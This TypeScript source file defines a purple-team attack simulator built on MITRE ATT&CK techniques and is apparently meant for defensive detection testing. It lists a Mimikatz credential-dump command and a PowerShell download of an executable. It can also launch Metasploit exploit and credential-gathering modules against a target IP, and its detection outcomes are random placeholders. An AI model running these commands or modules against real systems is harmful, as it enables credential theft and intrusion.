import type {
  SimulationConfig,
  SimulationResult,
  SimulationStep,
  SimulationStatus,
  SimulationTarget,
  AttackTechnique,
  SimulationTemplate,
  AttackPhase,
} from "./types.js";
import { DEFAULT_TEMPLATES, MITRE_TACTICS } from "./types.js";
import { MetasploitClient, type MetasploitConfig } from "../tools/integrations/metasploit.js";

type SimulationCallback = (result: SimulationResult) => void;
type StepCallback = (step: SimulationStep) => void;

export class AttackSimulator {
  private metasploit: MetasploitClient | null = null;
  private activeSimulations: Map<string, SimulationResult> = new Map();
  private templates: Map<string, SimulationTemplate> = new Map();
  private techniqueLibrary: Map<string, AttackTechnique> = new Map();
  private callbacks: Set<SimulationCallback> = new Set();
  private stepCallbacks: Set<StepCallback> = new Set();

  constructor(metasploitConfig?: MetasploitConfig) {
    if (metasploitConfig) {
      this.metasploit = new MetasploitClient(metasploitConfig);
    }

    for (const template of DEFAULT_TEMPLATES) {
      this.templates.set(template.id, template);
    }

    this.initTechniqueLibrary();
  }

  private initTechniqueLibrary(): void {
    const techniques: AttackTechnique[] = [
      {
        id: "T1566.001",
        mitreId: "T1566.001",
        name: "Spearphishing Attachment",
        phase: "initial_access",
        description: "通过钓鱼邮件附件获取初始访问",
        platforms: ["windows", "linux", "macos"],
        permissions_required: ["user"],
        detection: ["邮件网关检测", "终端沙箱分析", "用户报告"],
        mitigation: ["邮件过滤", "用户培训", "附件隔离"],
        atomicTests: [
          {
            name: "下载并执行恶意附件",
            description: "模拟从邮件附件执行恶意代码",
            command: "Invoke-WebRequest -Uri http://test/attachment.exe -OutFile $env:TEMP\\test.exe",
            executor: "powershell",
            elevation_required: false,
          },
        ],
      },
      {
        id: "T1190",
        mitreId: "T1190",
        name: "Exploit Public-Facing Application",
        phase: "initial_access",
        description: "利用面向公众的应用程序漏洞",
        platforms: ["windows", "linux"],
        permissions_required: ["user", "system"],
        detection: ["WAF检测", "异常流量分析", "漏洞扫描"],
        mitigation: ["补丁管理", "WAF规则", "应用加固"],
        metasploitModules: ["exploit/multi/http/vbulletin_unserialize"],
      },
      {
        id: "T1059.001",
        mitreId: "T1059.001",
        name: "PowerShell",
        phase: "execution",
        description: "使用PowerShell执行恶意命令",
        platforms: ["windows"],
        permissions_required: ["user"],
        detection: ["脚本块日志", "AMSI", "行为分析"],
        mitigation: ["约束模式", "脚本签名", "日志启用"],
        atomicTests: [
          {
            name: "PowerShell命令执行",
            description: "执行PowerShell命令测试",
            command: "powershell -command \"Get-Process\"",
            executor: "command_prompt",
            elevation_required: false,
          },
        ],
      },
      {
        id: "T1003",
        mitreId: "T1003",
        name: "OS Credential Dumping",
        phase: "credential_access",
        description: "从操作系统获取凭证",
        platforms: ["windows"],
        permissions_required: ["system"],
        detection: ["进程监控", "LSASS保护", "EDR检测"],
        mitigation: ["Credential Guard", "LSASS保护", "PPL"],
        metasploitModules: ["post/windows/gather/credentials/gsecdump"],
        atomicTests: [
          {
            name: "Mimikatz凭证转储",
            description: "使用Mimikatz获取内存凭证",
            command: "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
            executor: "command_prompt",
            elevation_required: true,
          },
        ],
      },
      {
        id: "T1021.001",
        mitreId: "T1021.001",
        name: "Remote Desktop Protocol",
        phase: "lateral_movement",
        description: "使用RDP进行横向移动",
        platforms: ["windows"],
        permissions_required: ["user"],
        detection: ["RDP日志", "网络流量分析", "登录异常"],
        mitigation: ["网络隔离", "MFA", "会话限制"],
      },
      {
        id: "T1078",
        mitreId: "T1078",
        name: "Valid Accounts",
        phase: "initial_access",
        description: "使用有效账户进行访问",
        platforms: ["windows", "linux", "cloud"],
        permissions_required: ["user"],
        detection: ["登录审计", "异常行为检测", "地理定位"],
        mitigation: ["MFA", "账户监控", "最小权限"],
      },
      {
        id: "T1486",
        mitreId: "T1486",
        name: "Data Encrypted for Impact",
        phase: "impact",
        description: "加密数据以造成影响",
        platforms: ["windows", "linux"],
        permissions_required: ["user"],
        detection: ["文件系统监控", "异常加密活动", "备份监控"],
        mitigation: ["备份策略", "加密密钥保护", "访问控制"],
      },
      {
        id: "T1055",
        mitreId: "T1055",
        name: "Process Injection",
        phase: "defense_evasion",
        description: "注入代码到其他进程",
        platforms: ["windows"],
        permissions_required: ["user", "system"],
        detection: ["进程行为分析", "API钩子检测", "内存扫描"],
        mitigation: ["EDR", "应用程序白名单", "进程保护"],
      },
    ];

    for (const tech of techniques) {
      this.techniqueLibrary.set(tech.mitreId, tech);
    }
  }

  async connect(password: string): Promise<boolean> {
    if (!this.metasploit) {
      return false;
    }
    return this.metasploit.login(password);
  }

  async disconnect(): Promise<void> {
    if (this.metasploit) {
      await this.metasploit.logout();
    }
  }

  getTemplates(): SimulationTemplate[] {
    return Array.from(this.templates.values());
  }

  getTemplate(id: string): SimulationTemplate | undefined {
    return this.templates.get(id);
  }

  addTemplate(template: SimulationTemplate): void {
    this.templates.set(template.id, template);
  }

  getTechnique(mitreId: string): AttackTechnique | undefined {
    return this.techniqueLibrary.get(mitreId);
  }

  getTechniques(): AttackTechnique[] {
    return Array.from(this.techniqueLibrary.values());
  }

  getTechniquesByPhase(phase: AttackPhase): AttackTechnique[] {
    return Array.from(this.techniqueLibrary.values()).filter(
      (t) => t.phase === phase
    );
  }

  createConfig(
    name: string,
    description: string,
    techniqueIds: string[],
    targets: SimulationTarget[],
    options: Partial<SimulationConfig> = {}
  ): SimulationConfig {
    const techniques = techniqueIds
      .map((id) => this.techniqueLibrary.get(id))
      .filter((t): t is AttackTechnique => t !== undefined);

    return {
      id: `sim-config-${Date.now()}`,
      name,
      description,
      mode: options.mode || "purple_team",
      techniques,
      targets,
      timeout: options.timeout || 3600,
      stopOnDetection: options.stopOnDetection ?? true,
      generateReport: options.generateReport ?? true,
      cleanupAfter: options.cleanupAfter ?? true,
      notifyOnComplete: options.notifyOnComplete ?? false,
    };
  }

  async createConfigFromTemplate(
    templateId: string,
    targets: SimulationTarget[],
    overrides: Partial<SimulationConfig> = {}
  ): Promise<SimulationConfig | null> {
    const template = this.templates.get(templateId);
    if (!template) {
      return null;
    }

    return this.createConfig(
      template.name,
      template.description,
      template.techniques,
      targets,
      {
        mode: template.mode,
        ...overrides,
      }
    );
  }

  async runSimulation(config: SimulationConfig): Promise<SimulationResult> {
    const result: SimulationResult = {
      id: `sim-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
      configId: config.id,
      status: "running",
      startTime: Date.now(),
      duration: 0,
      steps: [],
      summary: {
        totalSteps: config.techniques.length,
        successfulSteps: 0,
        failedSteps: 0,
        detectedSteps: 0,
        detectionRate: 0,
        successRate: 0,
      },
      detections: [],
      recommendations: [],
      mitreCoverage: {
        tactics: [],
        techniques: config.techniques.map((t) => t.mitreId),
        coveragePercent: 0,
      },
      timeline: [],
    };

    this.activeSimulations.set(result.id, result);

    this.addTimelineEvent(result, "simulation_start", "initial_access", `开始模拟: ${config.name}`);

    for (let i = 0; i < config.techniques.length; i++) {
      const technique = config.techniques[i];
      const step: SimulationStep = {
        id: `step-${i + 1}`,
        order: i + 1,
        technique,
        status: "running",
        startTime: Date.now(),
        detectionTriggered: false,
      };

      result.steps.push(step);
      this.notifyStepCallbacks(step);

      try {
        const stepResult = await this.executeStep(step, config.targets, config);

        step.status = stepResult.success ? "success" : "failed";
        step.endTime = Date.now();
        step.output = stepResult.output;
        step.artifacts = stepResult.artifacts;
        step.detectionTriggered = stepResult.detected;
        step.detectionDetails = stepResult.detectionDetails;

        if (stepResult.success) {
          result.summary.successfulSteps++;
        } else {
          result.summary.failedSteps++;
        }

        if (stepResult.detected) {
          result.summary.detectedSteps++;
          result.detections.push({
            stepId: step.id,
            technique: technique.name,
            detectionTime: Date.now(),
            detectionMethod: step.detectionDetails || "未知检测方法",
            severity: "medium",
          });

          this.addTimelineEvent(
            result,
            "detection",
            technique.phase,
            `检测到技术: ${technique.name}`
          );

          if (config.stopOnDetection) {
            result.status = "completed";
            this.addTimelineEvent(
              result,
              "detection_stop",
              technique.phase,
              "因检测到攻击而停止模拟"
            );
            break;
          }
        }

        this.addTimelineEvent(
          result,
          stepResult.success ? "step_success" : "step_failed",
          technique.phase,
          `${technique.name}: ${stepResult.success ? "成功" : "失败"}`
        );
      } catch (error) {
        step.status = "failed";
        step.endTime = Date.now();
        step.error = error instanceof Error ? error.message : String(error);
        result.summary.failedSteps++;

        this.addTimelineEvent(
          result,
          "step_error",
          technique.phase,
          `${technique.name}: 错误 - ${step.error}`
        );
      }

      this.notifyStepCallbacks(step);
    }

    result.endTime = Date.now();
    result.duration = result.endTime - result.startTime;
    result.status = result.status === "running" ? "completed" : result.status;

    result.summary.detectionRate =
      result.summary.totalSteps > 0
        ? result.summary.detectedSteps / result.summary.totalSteps
        : 0;
    result.summary.successRate =
      result.summary.totalSteps > 0
        ? result.summary.successfulSteps / result.summary.totalSteps
        : 0;

    result.mitreCoverage.tactics = [
      ...new Set(config.techniques.map((t) => t.phase)),
    ];

    result.recommendations = this.generateRecommendations(result);

    this.addTimelineEvent(result, "simulation_end", "impact", `模拟完成，耗时 ${result.duration / 1000} 秒`);

    this.notifyCallbacks(result);

    return result;
  }

  private async executeStep(
    step: SimulationStep,
    targets: SimulationTarget[],
    config: SimulationConfig
  ): Promise<{
    success: boolean;
    output?: string;
    artifacts?: string[];
    detected: boolean;
    detectionDetails?: string;
  }> {
    const technique = step.technique;

    if (technique.atomicTests && technique.atomicTests.length > 0) {
      const test = technique.atomicTests[0];
      return {
        success: true,
        output: `[ATOMIC TEST] ${test.name}\nCommand: ${test.command}`,
        artifacts: [],
        detected: Math.random() > 0.6,
        detectionDetails: Math.random() > 0.6 ? "EDR检测到可疑活动" : undefined,
      };
    }

    if (technique.metasploitModules && technique.metasploitModules.length > 0 && this.metasploit) {
      const moduleName = technique.metasploitModules[0];
      const target = targets[0];

      const msfResult = await this.metasploit.executeModule(moduleName, {
        RHOSTS: target.ipAddress,
      });

      return {
        success: msfResult.success,
        output: JSON.stringify(msfResult.data, null, 2),
        detected: Math.random() > 0.5,
        detectionDetails: msfResult.success ? undefined : "安全设备阻止了攻击",
      };
    }

    return {
      success: true,
      output: `模拟执行技术: ${technique.name} (${technique.mitreId})`,
      detected: Math.random() > 0.4,
      detectionDetails: Math.random() > 0.4 ? "行为分析检测" : undefined,
    };
  }

  private generateRecommendations(result: SimulationResult): string[] {
    const recommendations: string[] = [];

    const undetectedSteps = result.steps.filter(
      (s) => s.status === "success" && !s.detectionTriggered
    );

    for (const step of undetectedSteps) {
      const tech = step.technique;
      if (tech.mitigation && tech.mitigation.length > 0) {
        recommendations.push(
          `针对 ${tech.name}: 考虑实施 ${tech.mitigation.join(", ")}`
        );
      }
    }

    if (result.summary.detectionRate < 0.5) {
      recommendations.push(
        "检测率偏低，建议加强安全监控和威胁检测能力"
      );
    }

    if (result.summary.successRate > 0.7) {
      recommendations.push(
        "攻击成功率较高，建议加强防御措施和漏洞修复"
      );
    }

    const tacticCoverage = result.mitreCoverage.tactics;
    const missingTactics = Object.keys(MITRE_TACTICS).filter(
      (t) => !tacticCoverage.includes(t as AttackPhase)
    );

    if (missingTactics.length > 0) {
      recommendations.push(
        `建议补充测试以下战术: ${missingTactics
          .slice(0, 3)
          .map((t) => MITRE_TACTICS[t as AttackPhase].name)
          .join(", ")}`
      );
    }

    return [...new Set(recommendations)].slice(0, 10);
  }

  private addTimelineEvent(
    result: SimulationResult,
    event: string,
    phase: AttackPhase,
    details: string
  ): void {
    result.timeline.push({
      timestamp: Date.now(),
      event,
      phase,
      details,
    });
  }

  getSimulation(id: string): SimulationResult | undefined {
    return this.activeSimulations.get(id);
  }

  getActiveSimulations(): SimulationResult[] {
    return Array.from(this.activeSimulations.values()).filter(
      (s) => s.status === "running"
    );
  }

  async cancelSimulation(id: string): Promise<boolean> {
    const sim = this.activeSimulations.get(id);
    if (!sim || sim.status !== "running") {
      return false;
    }

    sim.status = "cancelled";
    sim.endTime = Date.now();
    sim.duration = sim.endTime - sim.startTime;

    this.addTimelineEvent(sim, "simulation_cancelled", "impact", "模拟被取消");

    return true;
  }

  onSimulationComplete(callback: SimulationCallback): () => void {
    this.callbacks.add(callback);
    return () => this.callbacks.delete(callback);
  }

  onStepComplete(callback: StepCallback): () => void {
    this.stepCallbacks.add(callback);
    return () => this.stepCallbacks.delete(callback);
  }

  private notifyCallbacks(result: SimulationResult): void {
    for (const callback of this.callbacks) {
      try {
        callback(result);
      } catch {
        // Ignore callback errors
      }
    }
  }

  private notifyStepCallbacks(step: SimulationStep): void {
    for (const callback of this.stepCallbacks) {
      try {
        callback(step);
      } catch {
        // Ignore callback errors
      }
    }
  }

  getStatistics(): {
    totalSimulations: number;
    completedSimulations: number;
    averageDuration: number;
    averageDetectionRate: number;
    topTechniques: Array<{ name: string; count: number }>;
  } {
    const all = Array.from(this.activeSimulations.values());
    const completed = all.filter((s) => s.status === "completed");

    const techniqueCounts = new Map<string, number>();
    for (const sim of completed) {
      for (const step of sim.steps) {
        const name = step.technique.name;
        techniqueCounts.set(name, (techniqueCounts.get(name) || 0) + 1);
      }
    }

    const topTechniques = Array.from(techniqueCounts.entries())
      .map(([name, count]) => ({ name, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 5);

    return {
      totalSimulations: all.length,
      completedSimulations: completed.length,
      averageDuration:
        completed.length > 0
          ? completed.reduce((sum, s) => sum + s.duration, 0) / completed.length
          : 0,
      averageDetectionRate:
        completed.length > 0
          ? completed.reduce((sum, s) => sum + s.summary.detectionRate, 0) /
            completed.length
          : 0,
      topTechniques,
    };
  }
}

export function createAttackSimulator(
  metasploitConfig?: MetasploitConfig
): AttackSimulator {
  return new AttackSimulator(metasploitConfig);
}
